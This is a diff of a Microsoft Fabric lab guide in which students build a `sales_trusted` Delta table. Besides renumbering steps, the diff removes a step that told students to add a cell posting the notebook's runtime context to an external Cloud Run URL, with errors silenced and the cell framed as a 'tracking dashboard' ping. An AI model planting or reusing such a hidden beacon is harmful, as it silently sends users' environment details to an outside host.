@@ -16,20 +16,25 @@ This lab continues from Lab 2.3. Your HomeSphere lakehouse and the `cleaned_sale
 !!! success "The lakehouse is attached. The notebook can read the `cleaned_sales` table created in Lab 2.3."
 
 
-## Step 2: Run the notebook
+## Steps 2-7: Work through the notebook
 
-The notebook reads `cleaned_sales` from the lakehouse, joins it to the product catalogue, and writes the result as a new Delta table called `sales_trusted`.
+Steps 2 to 7 are in the `cloud_output` notebook. It reads `cleaned_sales` from the lakehouse, joins it to the product catalogue, and writes the result as a new Delta table called `sales_trusted`.
 
-1. Run each cell in order - use **Run all** or step through them one at a time.
+1. Work through each cell, completing the exercise sections where indicated.
+
+    !!! tip "Want to check your work?"
+        - Open **Jupyter Notebook** on your Virtual Machine
+        - Open `M3/HomeSphere/solution/cloud_output_solution.ipynb`
+        - Keep it beside Fabric to compare as you go
 
     !!! note
-        The first cell reads the `cleaned_sales` Delta table you created in Lab 2.3:
+        Step 2 of the notebook reads the `cleaned_sales` Delta table you created in Lab 2.3:
         ```python
         sales = spark.read.table('cleaned_sales').toPandas()
         ```
         Instead of loading a CSV from your VM, you are reading a managed table from OneLake - always the latest version, with lineage tracked automatically.
 
-2. When you reach the `%%sql` cell, review the query before running it:
+2. When you reach the `%%sql` cell in Step 6, review the query before running it:
 
     ```sql
     %%sql
@@ -42,29 +47,19 @@ The notebook reads `cleaned_sales` from the lakehouse, joins it to the product c
     !!! note
         `%%sql` is a magic command that runs a SQL query directly against your lakehouse tables. This is the same revenue question you answered with `groupby` on Day 1 - the answer should match.
 
-3. Add one more code cell at the end, to ping the tracking dashboard once the table is written:
 
-    ```python
-    import requests
-    ctx = dict(notebookutils.runtime.context)
-    ctx["source"] = "de5m3-lab24"
+## Step 8: Run all cells and stop the session
 
-    try:
-        requests.post("https://qapha-249748487450.us-east1.run.app/", json=ctx, timeout=5)
-    except Exception:
-        pass  # a dead endpoint must never fail the notebook run
-    ```
-
-4. Run all remaining cells and confirm the notebook completes without errors.
+1. Run all cells and confirm the notebook completes without errors.
 
     !!! success "The `sales_trusted` table should now appear in the **Tables** section of your lakehouse."
 
-5. After running the last cell, select the **Run** tab above the ribbon and then select **Stop session**.
+2. After running the last cell, select the **Run** tab above the ribbon and then select **Stop session**.
 
     - This stops the compute resource being used by the notebook.
 
 
-## Step 3: Explore the results in the SQL analytics endpoint
+## Step 9: Explore the results in the SQL analytics endpoint
 
 1. In the left navigation bar, return to your **HomeSphere** lakehouse.
 
